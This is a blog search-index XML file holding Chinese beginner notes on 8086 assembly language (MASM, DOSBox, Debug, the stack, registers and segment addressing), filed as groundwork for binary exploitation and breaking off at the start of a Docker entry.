<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>五、程序的编写与执行</title>
    <link href="/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/"/>
    <url>/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%94%E3%80%81%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%BC%96%E5%86%99%E4%B8%8E%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="五、程序的编写与执行"><a href="#五、程序的编写与执行" class="headerlink" title="五、程序的编写与执行"></a>五、程序的编写与执行</h1><p><strong>汇编语言程序写出到执行的过程：</strong> 写出源程序—&gt;对源程序进行编译连接—&gt;生成可执行文件—&gt;操作系统将其加载入内存—&gt;CPU执行程序</p><h2 id="1-源程序"><a href="#1-源程序" class="headerlink" title="1.源程序"></a>1.源程序</h2><p>源程序包括汇编语言和伪指令。<br>示例：<br><img src="/.com//efb0bbc8ec7640f394f8969ec7121190.png" alt="在这里插入图片描述"></p><h3 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h3><p>伪指令是给编译器看的指令，编译器根据伪指令来进行相关编译工作。</p><h4 id="1-segment与ends"><a href="#1-segment与ends" class="headerlink" title="(1) segment与ends"></a>(1) segment与ends</h4><p>作用：定义一个段。<br>segment 表示一个段的开始，ends 表示一个段的结束。</p><p>用法：</p><blockquote><p>段名 segment<br>：<br>段名 ends</p></blockquote><h4 id="2-end"><a href="#2-end" class="headerlink" title="(2) end"></a>(2) end</h4><p>作用：结束编译。<br><strong>PS：</strong> 注意区分end与ends的含义。</p><p>用法：在程序结尾处使用。</p><h4 id="3-assume"><a href="#3-assume" class="headerlink" title="(3) assume"></a>(3) assume</h4><p>作用：将段与指定的段寄存器关联起来。（即声明该段在CPU中的执行位置）</p><p>用法：在一个段的开头使用。</p><blockquote><p>assume  段寄存器:段名</p></blockquote><h4 id="4-标号"><a href="#4-标号" class="headerlink" title="(4) 标号"></a>(4) 标号</h4><p>一个标号指代了一个段地址。<br>它被编译后最终处理为一个段地址。</p><h3 id="程序与程序结构"><a href="#程序与程序结构" class="headerlink" title="程序与程序结构"></a>程序与程序结构</h3><p><img src="/.com//a18ac4c6e20743bb9f68b823b86ee62d.png" alt="图4.2"></p><h3 id="程序返回"><a href="#程序返回" class="headerlink" title="程序返回"></a>程序返回</h3><h4 id="1-DOS中的程序运行"><a href="#1-DOS中的程序运行" class="headerlink" title="(1)DOS中的程序运行"></a>(1)DOS中的程序运行</h4><p>DOS是一个单任务的操作系统。</p><p>当要运行XXX.exe程序时，DOS程序会终止运行，CPU将控制权移交给此exe程序，程序运行完成后，会返回DOS程序继续运行，等待下一条指令的输入。</p><p>我们称这个过程为<strong>程序返回</strong></p><p>原理详见CSAPP中对于进程与线程的阐述。</p><h4 id="2-实现程序返回（中断机制）"><a href="#2-实现程序返回（中断机制）" class="headerlink" title="(2) 实现程序返回（中断机制）"></a>(2) 实现程序返回（中断机制）</h4><p>在程序末尾添加返回的程序段。</p><blockquote><p>mov ax,4c00H<br>int 21H</p></blockquote><p><strong>PS:</strong> 这是汇编指令，由CPU负责执行。</p><p>小结：<br><img src="/.com//de516d9e4e404a4d841ce1ddfcdbf566.png" alt="表4.1"></p><h3 id="逻辑错误与语法错误"><a href="#逻辑错误与语法错误" class="headerlink" title="逻辑错误与语法错误"></a>逻辑错误与语法错误</h3><p>被编译器发现的错误是语法错误；编译后，在运行时发生的错误是逻辑错误。<br>（<strong>一个是语句错误书写，一个是缺少必要语句或者本身的逻辑问题</strong>）</p><h2 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2.环境配置"></a>2.环境配置</h2><blockquote><p>(1)下载Notepad++（用于编写源程序，用其他文本软件也可以）<br>(2)下载MASM,并将这几个程序与源程序文件放在一起<br>(3)在Notepad++上编写源程序并保存到上述的文件夹中</p></blockquote><h2 id="3-源程序的编译、连接与执行"><a href="#3-源程序的编译、连接与执行" class="headerlink" title="3.源程序的编译、连接与执行"></a>3.源程序的编译、连接与执行</h2><p>(1)如源程序的示例那样编写好源程序后，我们就可以将其保存为一个XXX.asm的文件，然后进入DOSBox程序，输入以下命令以打开源程序文件所在位置：</p><blockquote><p>mount c D:\StudyAssembler\MASM\ (文件所在位置)<br>C:</p></blockquote><p>如图所示：<br><img src="/.com//5b1206afc3884188aed6e36c6b49414d.png" alt="step1："></p><p>(2)输入以下命令以编译源程序：</p><blockquote><p>masm 1.asm</p></blockquote><p>如下图所示：<br><img src="/.com//01840e2ce7d7427cb3c6388c2ce9fae6.png" alt="在这里插入图片描述"></p><p>(3)编译完成后会生成一个1.obj对象文件，输入以下命令以连接程序：</p><blockquote><p>link 1.obj</p></blockquote><p>由于书本中的1.asm文件只有一个代码段，所以无需作其他配置，接下来一直回车直到出现命令行的出现。</p><p>如下图所示：<br><img src="/.com//9457bf9e04a2456fb0a9b95b8f49a9f8.png" alt="在这里插入图片描述"><br>(4)输入“1.exe”运行程序，会看到一个短暂的黑屏，然后回到DOS命令行，程序运行完毕。</p><p>至此，我们完成了1.asm文件的编译、连接和运行，但是，我们并没有看到运行程序的过程。</p><p><strong>PS:</strong> </p><ul><li>XXX.com文件大小为64KB，只能有一个段。<br>  XXX.exe文件可以很大，其中一般有多个段。<br>  所以当你编写的程序中只有一个段，可以考虑使用XXX.com文件执行，可以用于伪装。</li><li>可以用“ML 1.asm”指令来编译并连接程序，并且文件后缀和文件名有时可省略，因为已默认文件位置和类型。</li><li>可以指定文件生成的位置，只需在执行文件前加上路径</li><li>Link的作用：可以将源程序分开编译，然后将它们连在一起</li><li>在命令行输入指令后加分号，可以使编译器忽略中间文件的生成，更简捷</li></ul><h2 id="4-对于DOS程序运行原理的解释"><a href="#4-对于DOS程序运行原理的解释" class="headerlink" title="4.对于DOS程序运行原理的解释"></a>4.对于DOS程序运行原理的解释</h2><blockquote><p>(1)任何通用系统都要提供shell（外壳）程序，用户使用此程序来操作计算机系统进行工作。<br>(2)DOS中有一个程序command.com，这个程序在DOS中称为命令解释器，也就是DOS系统的shell。<br>(3)DOS启动时，先完成其他重要的初始化工作，然后运行command.com，command.com运行后，执行完其他的相关任务后，在屏幕上显示出由当前盘符和当前路径组成的提示符,比如:“c:\”或“c:\windows”等，然后等待用户的输入。<br>(4)command首先根据文件名找到可执行文件，然后将这个可执行文件中的程序加载入内存，设置CS:IP指向程序的入口。此后，command暂停运行，CPU运行程序。程序运行结束后，返回到command中，command再次显示由当前盘符和当前路径组成的提示符，等待用户的输入。在DOS中，command处理各种输入:命令或要执行的程序的文件名。我们就是通过command来进行工作的。</p></blockquote><p>故汇编程序的完整执行过程为：<br>编程 (Edit) 一&gt;l.asm一&gt;编译(masm)一&gt;1.obj一&gt;连接(link)一&gt;1.exe一&gt;加载 (command) 一&gt;内存中的程序一&gt;运行(CPU)</p><h2 id="5-跟踪程序的执行"><a href="#5-跟踪程序的执行" class="headerlink" title="5.跟踪程序的执行"></a>5.跟踪程序的执行</h2><p>在源程序的汇编指令前加标号（对段命名），并在end后加上这个标号，就给程序设置了一个入口。<br>Debug利用中断指令实现对程序的跟踪。<br>CX中存放程序的长度。<br><img src="/.com//1ce74633aafe437480a8c67bde1d2c2f.png" alt="图4.20"><br>上图说明内存中程序存放在DS地址+10H（即256字节）处，这256字节里存放着PSP，DOS用来和程序通信。<br>故程序的物理地址为：(X+16)x16+0 (左移一格)<br>可用段地址和偏移地址：X+10H:0</p><p>Debug的执行原理：command加载Debug，Debug加载1.exe。程序结束后从1.exe中的程序返回到Debug，从Debug返回到command。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>四、使用Debug进行简单汇编指令编程</title>
    <link href="/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8Debug%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E5%9B%9B%E3%80%81%E4%BD%BF%E7%94%A8Debug%E8%BF%9B%E8%A1%8C%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="四、使用Debug进行简单汇编指令编程"><a href="#四、使用Debug进行简单汇编指令编程" class="headerlink" title="四、使用Debug进行简单汇编指令编程"></a>四、使用Debug进行简单汇编指令编程</h1><h2 id="1-DOSBox和Debug安装及使用"><a href="#1-DOSBox和Debug安装及使用" class="headerlink" title="1.DOSBox和Debug安装及使用"></a>1.DOSBox和Debug安装及使用</h2><p>由于目前的Windows系统不再支持Debug的直接使用，所以我们需要先安装DOSBox和Debug来进行汇编指令编程。</p><p><strong>安装</strong></p><p>安装地址网上一般都能搜到，这里只贴出：DOSBox的地址：<a href="https://www.dosbox.com/">https://www.dosbox.com</a></p><p><strong>使用</strong></p><p>点开安装后一直Next，选个你需要的磁盘位置安装（一般是D盘）就可以，安装Debug的时候需要注意Debug的文件路径。</p><ol><li>打开DOSBox后，使用“mount c Debug位置”来让DOSBox进入Debug程序运行；然后输入“C:”<br> ；最后输入“debug”就能运行了。<br> 但是每次进入DOSBox程序时都要重复输入该指令，所以我们可以打开DOSBox文件位置，找到“…Option.bat”文件，然后如图把指令挪过来：<br> <img src="/.com//2bf3679bd8d446aea6926cf6fcffd97e.png" alt="DOSBox配置"><br> 以后每次打开就能直接运行Debug程序了。</li><li>打开DOSCBox后可以发现窗口无法放大缩小，可以打开“…Option.bat”文件后找到<br> “windowresolution&#x3D;original<br>  output&#x3D;surface”代码，将它改为<br>  “windowresolution&#x3D;你需要的分辨率（如1200x800）<br>  output&#x3D;opengl”就能正常放大程序窗口了。</li></ol><h2 id="2-Debug命令"><a href="#2-Debug命令" class="headerlink" title="2.Debug命令"></a>2.Debug命令</h2><p>可以参照这篇文章进行了解和学习：<br>一般是先用r命令查看当前寄存器内部的值，再用a命令进行编程。<br><a href="https://blog.csdn.net/weixin_43809545/article/details/103640185">汇编语言DEBUG命令详解||汇编命令||DEBUG的常用命令：A,U,R,T,D,E,Q 等等</a></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>三、栈</title>
    <link href="/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%89%E3%80%81%E6%A0%88/"/>
    <url>/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%B8%89%E3%80%81%E6%A0%88/</url>
    
    <content type="html"><![CDATA[<h1 id="三、-栈"><a href="#三、-栈" class="headerlink" title="三、*栈"></a>三、*栈</h1><h2 id="1-栈的概念"><a href="#1-栈的概念" class="headerlink" title="1. 栈的概念"></a>1. 栈的概念</h2><p>栈是一种具有特殊的访问方式的<strong>存储空间</strong>。它的特殊性就在于，最后进入这个空间的数据，最先出去。</p><h2 id="2-CPU栈机制"><a href="#2-CPU栈机制" class="headerlink" title="2. CPU栈机制"></a>2. CPU栈机制</h2><p>入栈就是将一个新的元素放到栈顶，出栈就是从栈顶取出一个元素。栈顶的元素总是最后入栈，需要出栈时，又最先被从栈中取出。栈的这种操作规则被称为:LIFO(Last In First Out，后进先出)。<br>从程序化的⻆度来讲，应该有一个标记，这个标记一直指示着栈顶。（SS：SP）</p><ul><li>栈从栈底(高位)开始存入数据，从栈顶(低位)开始复制数据转移出寄存器。</li></ul><h2 id="3-SS和SP"><a href="#3-SS和SP" class="headerlink" title="3. SS和SP"></a>3. SS和SP</h2><p>CPU 如何知道栈顶的位置?显然，也应该有相应的寄存器来存放栈顶的地址，8086CPU中，有两个寄存器，<strong>段寄存器SS和寄存器SP，栈顶的段地址存放在SS中，偏移地址存放在SP中。任意时刻，SS:SP指向栈顶元素。push指令和pop指令执行时，CPU 从SS 和SP 中得到栈顶的地址。</strong></p><blockquote><p>push ax 的执行，由以下两步完成。<br>(1)SP&#x3D;SP-2，SS:SP 指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶;<br>(2)将ax中的内容送入SS:SP 指向的内存单元处，SS:SP此时指向新栈顶。</p></blockquote><blockquote><p>pop ax的执行过程和push ax刚好相反，由以下两步完成。<br>(1)将SS:SP 指向的内存单元处的数据送入ax 中;<br>(2)SP&#x3D;SP+2，SS:SP 指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。</p></blockquote><ul><li>push指令先指定空位置，再存入数据</li><li>pop指令先存入数据到寄存器中，再改变SS:SP位置</li><li>pop 操作前的栈顶元素依然存在，但是，它己不在栈中。当再次执行 push 等入栈指令后，SS:SP移至上一个内存单元，并在里面写入新的数据，它将被覆盖。<br>  故磁盘格式化并没有清除数据，只是把“指针”复位了而已，下次写入只是覆盖原有数据，可以复原。</li></ul><h2 id="4-栈溢出"><a href="#4-栈溢出" class="headerlink" title="4. 栈溢出"></a>4. 栈溢出</h2><p>将 10010H~1001FH当作栈空间，该栈空间容量为16字节(8字)，初始状态为空，SS&#x3D;1000H、SP&#x3D;0020H，SS:SP 指向10020H;<br>在执行8次push ax 后，向栈中压入8个字，栈满，SS: SP 指向 10010H;<br>再次执行 push ax: sp&#x3D;sp- 2，SS:SP 指向 1000EH，栈顶超出了栈空间，ax 中的数据送入1000 EH 单元处，将栈空间外的数据覆盖<br>上面描述了执行push、pop 指令时，发生的栈顶超界问题。可以看到，当栈满的时候再使用push 指令入栈，或栈空的时候再使用pop 指令出栈，都将发生栈顶超界问题（栈溢出）。</p><p>栈顶超界是危险的，因为我们既然将一段空间安排为栈，那么在栈空间之外的空间里很可能存放了具有其他用途的数据、代码等，这些数据、代码可能是我们自己程序中的，也可能是别的程序中的(毕竟一个计算机系统中并不是只有我们自己的程序在运行)。但是由于我们在入栈出栈时的不小心，而将这些数据、代码意外地改写，将会引发一连串的错误。</p><blockquote><p><strong>PS：</strong> 如果是故意造成栈溢出的，就可以利用此特性将一些程序中的受保护数据取出（例如用户登录密码等信息），所以栈溢出也是PWN攻击的一种方式。</p></blockquote><p>8086CPU只知道栈项在何处(由SS:SP指示) ，而不知道我们安排的栈空间有多大。这点就好像CPU只知道当前要执行的指令在何处(由CS:IP指示)，而不知道要执行的指令有多少。从这两点上我们可以看出8086CPU 的工作机理，它只考虑当前的情况:当前的栈顶在何处、当前要执行的指令是哪一条。</p><h2 id="5-栈段"><a href="#5-栈段" class="headerlink" title="5. 栈段"></a>5. 栈段</h2><p>我们可以将长度为N( ≤ 64KB) 的一组地址连续、起始地址为16的倍数的内存单元，当作栈空间来用，从而定义了一个栈段。比如，我们将 10010H~1001FH 这段长度为16字节的内存空间当作栈来用，以栈的方式进行访问。这段空间就可以称为一个栈段。</p><p>如果将 10000H~1FFFFH 这段空间当作栈段，SS&#x3D;1000H，栈空间为64KB，栈最底部的字单元地址为1000:FFFE。任意时刻，SS:SP 指向栈顶单元，当栈中只有一个元素的时候，S S&#x3D;1000H，SP&#x3D;FFFEH。栈为空，就相当于栈中唯一的元素出栈，出栈后，SP&#x3D;SP+2.<br>SP原 来为FFFEH，加2后SP&#x3D;0，所以，当栈为空的时候，SS&#x3D;1000H，SP&#x3D;0。</p><p>换一个⻆度看，任意时刻，SS:SP 指向栈顶元素，当栈为空的时候，栈中没有元素，也就不存在栈顶元素，所以sS:SP 只能指向栈的最底部单元下面的单元，该单元的地址为栈最底部的字单元的地址+2。栈最底部字单元的地址为1000:FFFE ，所以栈空时，SP&#x3D;0000H.</p><p><strong>段的总结</strong></p><p>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元。这完全是我们自己的安排。<br>不管我们如何安排，CPU将内存中的某段内容当作代码，是因CSIP 指向了那里:CPU将某段内存当作栈，是因为SS;SP 指向了那里。我们一定要清楚，什么是我们的安排，以及如何让CPU 按我们的安排行事。要非常清楚 CPU 的工作机理，才能在控制 CPU 按照我们的安排运行的时候做到游刃有余。</p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二、寄存器与简单汇编指令</title>
    <link href="/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/"/>
    <url>/2023/07/30/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/%E4%BA%8C%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E%E7%AE%80%E5%8D%95%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="二、寄存器与简单汇编指令"><a href="#二、寄存器与简单汇编指令" class="headerlink" title="二、寄存器与简单汇编指令"></a>二、寄存器与简单汇编指令</h1><h2 id="1-简单汇编指令"><a href="#1-简单汇编指令" class="headerlink" title="1.* 简单汇编指令"></a>1.* 简单汇编指令</h2><h3 id="1-1-mov-add和sub指令"><a href="#1-1-mov-add和sub指令" class="headerlink" title="1.1 mov,add和sub指令"></a>1.1 mov,add和sub指令</h3><p><strong>mov指令（传输指令）</strong><br>用C语言可理解为赋值语句，如”mov ax,bx”<br>可理解成”ax&#x3D;bx”。</p><p>使用形式如下：<br>mov  寄存器，数据           比如:  mov ax,8<br>mov  寄存器，寄存器  比如: mov ax,bx<br>mov  寄存器，内存单元    比如: mov ax,[0]<br>mov  内存单元，寄存器    比如: mov [0],ax<br>mov  段寄存器，寄存器    比如: mov ds,ax<br>mov  寄存器，段寄存器    比如: mov ax,ds<br>mov  内存单元，段寄存器 比如:mov [0],ds<br>mov  段寄存器，内存单元 比如:mov ds,[0]</p><p><strong>add和sub指令</strong><br>类似C语言中”+&#x3D;”和”-&#x3D;”这两个运算符号，如”add ax,8”和”sub ax,8”可分别翻译成”ax+&#x3D;8”和”ax-&#x3D;8”这两种运算。</p><p>使用形式可参照上述方式用debug自行实验，不再赘述。</p><h3 id="1-2-jmp指令（转移指令）"><a href="#1-2-jmp指令（转移指令）" class="headerlink" title="1.2 jmp指令（转移指令）"></a>1.2 jmp指令（转移指令）</h3><p>用于修改CS和IP的值来控制CPU执行目标指令。<br>若想同时修改CS、IP的值，可用<br>“<strong>jmp 段地址：偏移地址</strong>”的指令完成。如：<br>jmp 2AE3:3,执行后，CS&#x3D;2AE3H,IP&#x3D;0003H,CPU将从2AE33H处读取指令。<br>jmp 3:0B16,执行后，CS&#x3D;0003H,IP&#x3D;0B16H,CPU将从00B46H处读取指令。<br>若只想修改IP的值，可用“<strong>jmp 某一合法寄存器</strong>”完成。如：<br>jmp ax,在含义上好似“mov IP,ax”意思是用寄存器的值修改IP。</p><h3 id="1-3-push和pop指令（入栈、出栈指令）"><a href="#1-3-push和pop指令（入栈、出栈指令）" class="headerlink" title="1.3 push和pop指令（入栈、出栈指令）"></a>1.3 push和pop指令（入栈、出栈指令）</h3><p>push和pop指令是可以在寄存器和内存（栈空间当然也是内存空间的一部分，它只是一段可以以一种特殊的方式进行访问的内存空间。）之间传送数据的。</p><p>push和pop指令的格式可以是如下形式:</p><blockquote><p>push 寄存器;将一个奇存器中的数据入栈<br>pop 寄存器;出栈，用一个寄存器接收出栈的数据</p></blockquote><p>(PS:用什么类型数据入栈，就用什么类型数据出栈。）</p><p>指令执行时，CPU要知道内存单元的地址，可以在push、pop 指令中只给出内存单元的偏移地址，段地址在指令执行时，CPU 从ds 中取得。</p><ul><li>用栈来暂存以后需要恢复的寄存器中的内容时，出栈的顺序要和入栈的顺序相反，因为最后入栈的寄存器的内容在栈顶，所以在恢复时，要最先出栈。</li><li>将寄存器清零，可以用</li></ul><blockquote><p>mov ax,0<br>sub ax,ax<br>xor ax,ax</p></blockquote><h2 id="2-寄存器"><a href="#2-寄存器" class="headerlink" title="2.  寄存器"></a>2.  寄存器</h2><blockquote><p>一个典型的CPU由运算器、控制器、寄存器(CPU工作原理)等器件构成，这些器件靠内部总线相连。其中寄存器进行信息存储。程序员正是通过改变各种寄存器中的内容来实现对CPU的控制。</p></blockquote><p><strong>每一代CPU都是向下兼容的。</strong></p><blockquote><p>8086CPU 的上一代CPU中的寄存器都是8位的，为了保证兼容，使原来基于上代CPU编写的程序稍加修改就可以运行在8086之上，8086CPU的AX、BX、CX、DX这4个寄存器都可分为两个可独立使用的8位寄存器来用</p><ul><li>AX可分为AH和AL;</li><li>BX 可分为BH 和BL;</li><li>CX 可分为CH 和CL;</li><li>DX可分为DH和DL。</li></ul></blockquote><p>以 AX 为例，8086CPU的16位寄存器分为两个8位寄存器的情况如图2. 3所示。<br><img src="/.com//defee50d784d47928bf3401aa152638d.png" alt="图23"></p><h3 id="2-1-字在寄存器中的存储"><a href="#2-1-字在寄存器中的存储" class="headerlink" title="2.1 字在寄存器中的存储"></a>2.1 字在寄存器中的存储</h3><p>8086CPU可以一次性处理以下两种尺寸的数据。</p><ul><li>字节: 记为byte,一个字节由8个bit组成，可以存在8位寄存器中。</li><li>宇:记为word，一个字由两个字节组成，这两个字节分别称为这个字的高位字节和低位字节，一个字可以存在一个16位寄存器中，这个字的高位字节和低位字节自然就存在这个寄存器的高8位寄存器和低8位寄存器中。一个字型数据20000，存在AX寄存器中，在AH中存储它的高8位，在AL中存储了它的低8位。<strong>AH和AL中的数据，既可以看成是一个字型数据的高8位和低8位，这个字型数据的大小是20000:又可以看成是两个独立的字节型数据，它们的大小分别是78和32。</strong></li><li><strong>高位存储高地址，低位存储低地址。</strong></li><li>一个字要用两个地址连续的内存单元来存放</li><li>任何两个地址连续的内存单元，N号单元和 N+1号单元，可以将它们看成两个内存单元，也可看成一个地址为N的字单元中的高位字节单元和低位字节单元。</li></ul><blockquote><p>字节型数据:该地址存放数据，是一个字节。<br>字型数据:整体所指数据，是一个字。</p></blockquote><h3 id="2-2-物理地址与偏移地址"><a href="#2-2-物理地址与偏移地址" class="headerlink" title="2.2 物理地址与偏移地址"></a>2.2 物理地址与偏移地址</h3><blockquote><p><strong>物理地址：</strong> CPU访问内存单元时，要给出内存单元的地址。所有的内存单元构成的存储空间是一个一维的线性空间，每一个内存单元在这个空间中都有唯一的地址，我们将这个唯一的地址称为物理地址。</p></blockquote><p>CPU 通过地址总线送入存储器的，必须是一个内存单元的物理地址。在 CPU 向地址总线上发出物理地址之前，必须要在内部先形成这个物理地址。不同的CPU可以有不同的形成物理地址的方式。</p><p><strong>16位CPU（8086CPU）：</strong> </p><ul><li>运算器一次最多可以处理16位的数据</li><li>寄存器的最大宽度为16位</li><li>寄存器和运算器之间的通路为16位</li></ul><blockquote><p>8086CPU有20位地址总线，可以传送20位地址，达到IMB寻址能力。8086CPU又是16位结构，在内部一次性处理、传输、暂时存储的地址为16位。从8086CPU的内部结构来看，如果将地址从内部简单地发出，那么它只能送出16位的地址，表现出的寻址能力只有64KB。8086CPU采用一种在内部用两个16位地址合成的方法来形成一个20位的物理地址。<br><img src="/.com//cc2d16a08ce84e4da0e2098aa45f83a0.png" alt="图2.6"><br>(1)CPU中的相关部件提供两个16位的地址，一个称为段地址，另一个称为偏移地址;<br>(2)段地址和偏移地址通过内部总线送入一个称为地址加法器的部件;<br>(3)地址加法器将两个16位地址合成为一个20位的物理地址;<br>(4)地址加法器通过内部总线将20位物理地址送入输入输出控制电路;<br>(5)输入输出控制电路将20位物理地址送上地址总线;<br>(6)20位物理地址被地址总线传送到存储器。</p></blockquote><p>地址加法器采用<strong>“物理地址&#x3D;段地址x16+偏移地址”</strong>的方法用段地址和偏移地址合成物理地址。</p><p><strong>“段地址x16”的含义：</strong><br>(1)一个数据的二进制形式左移1位，相当于该数据乘以2:<br>(2)一个数据的二进制形式左移N位，相当于该数据乘以2的N次方;<br>(3)地址加法器完成段地址×16的运算就是将以二进制形式存放的段地址左移4位。<br>(4)进一步可知一个X进制的数据左移1位，相当于乘以X。</p><p><strong>“物理地址&#x3D;段地址x16+偏移地址”的本质含义</strong><br>CPU在访问内存时，用一个基础地址(段地址×16)和一个相对于基础地址的偏移地址相加，给出内存单元的物理地址。<br>更一般地说，8086CPU的这种寻址功能是 <strong>“基础地址+偏移地址&#x3D;物理地址”寻址模式</strong>的一种具体实现方案。8086CPU中，段地址×16可看作是基础地址。</p><h3 id="2-3-段"><a href="#2-3-段" class="headerlink" title="2.3 段"></a>2.3 段</h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="(1) 基本概念"></a>(1) 基本概念</h4><p>其实，内存并没有分段，段的划分来自于CPU我们可以用分段的方式来管理内存。(人为规定的)<br>将若干地址连续的内存单元看作一个段，用段地址×16定位段的起始地址(基础地址)，用偏移地址定位段中的内存单元。<br>段地址x16必然是16的倍数，所以一个段的起始地址也一定是16的倍数:偏移地址为16位，16位地址的寻址能力为64KB，所以给定一个段地址，仅通过变化偏移地址来进行寻址,偏移地址16位，变化范围为0- FFFFH，仅用偏移地址来寻址最多可寻64KB个内存单元。</p><p>PS:</p><ul><li>CPU 可以用不同的段地址和偏移地址形成同一个物理地址</li><li>“数据在21F60H内存单元中。”有两种类似的说法:<br>  1.数据存在内存2000:1F60单元中；<br>  2.数据存在内存的2000H段中的1F60H单元中。</li></ul><h4 id="2-段寄存器"><a href="#2-段寄存器" class="headerlink" title="(2) 段寄存器"></a>(2) 段寄存器</h4><p>8086CPU有4个段寄存器:CS、DS、SS、ES。当8086CPU要访问内存时由这4个段寄存器提供内存单元的段地址。</p><h4 id="3-CS和IP"><a href="#3-CS和IP" class="headerlink" title="(3) CS和IP"></a>(3) CS和IP</h4><p>CS和IP是8086CPU中两个最关键的寄存器，它们指示了CPU当前要读取指令的地址。CS 为代码段寄存器，IP 为指令指针寄存器，从名称上我们可以看出它们和指令的关系。<br>在8086PC机中，任意时刻，设CS中的内容为M，IP 中的内容为N，8086CPU将从内存Mx16+N 单元开始，读取一条指令并执行。<br>也可以这样表述:8086机中，任意时刻，CPU将CS:IP 指向的内容当作指令执行。<br><img src="/.com//402003a59d1a41e4aa8d5fc577ad5d91.png" alt="图2.10"><br>如图可知，将数据存放到寄存器中需要三个字节，对两个寄存器进行操作需要两个字节。</p><blockquote><p>8086CPU的工作过程可简要描述如下：<br>(1)从CS:IP指向的内存单元读取指令，读取的指令进入指令缓冲器;<br>(2)IP&#x3D;IP+所读取指令的长度，从而指向下一条指令;<br>(3)执行指令。转到步骤(1)，重复这个过程。</p></blockquote><p><strong>CPU将CS: IP指向的内存单元中的内容看作指令</strong>，因为，在任何时候，CPU将CS、IP 中的内容当作指令的段地址和偏移地址，用它们合成指令的物理地址，到内存中读取指令码，执行。</p><h4 id="4-代码段"><a href="#4-代码段" class="headerlink" title="(4)代码段"></a>(4)代码段</h4><p>可以根据需要，将一组内存单元定义为一个段。我们可以将长度为N(N≤64KB)的一组代码，存在一组地址连续、起始地址为16的倍数的内存单元中，我们可以认为，这段内存是用来存放代码的，从而定义了 一个代码段。(同样是人为规定的，CPU不知道，它只负责读写指令，执行)</p><h4 id="5-数据段"><a href="#5-数据段" class="headerlink" title="(5)数据段"></a>(5)数据段</h4><p>我们可以将一组长度为 N( ≤ 64KB) 、地址连续、起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段用DS存放数据段的段地址，再根据需要，用相关指令访问数据段中的具体单元。（同上）</p><h4 id="6-DS和-address"><a href="#6-DS和-address" class="headerlink" title="(6) DS和[address]"></a>(6) DS和[address]</h4><p>内存地址由段地址和偏移地址组成。8086CPU 中有DS寄存器，通常用来存放要访问数据的段地址。</p><p><strong>“[…]”表示一个内存单元，“[…]”中的0表示内存单元的偏移地址。</strong><br>“mov al,[0]”指令执行时，8086CPU自动取DS中的数据为内存单元的段地址。<br>10000H 用段地址和偏移地址表示为1000:0，我们先将段地址1000H放入ds，然后用”mov al,[0]”完成传送。mov指令中的[0]说明操作对象是一个内存单元，[0]中的”0”说明这个内存单元的偏移地址是0，它的段地址默认放在DS中，指令执行时，8086CPU会自动从DS中取出。<br><strong>“数据——&gt;通用寄存器——&gt;段寄存器”</strong></p><blockquote><p>mov bx, 1000H<br>mov ds,bx</p></blockquote><p>是给段寄存器赋值的常用操作。</p><p><strong>下面是字传送的详细操作：</strong><br><img src="/.com//0b2fc703b22f42c7b3793895ccd482ff.png" alt="在这里插入图片描述"><br><img src="/.com//d4d7921bd5074a70ae90b940a3a338c8.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn前置知识</category>
      
      <category>汇编语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>汇编语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker</title>
    <link href="/2023/07/30/Docker/Docker/"/>
    <url>/2023/07/30/Docker/Docker/</url>
    
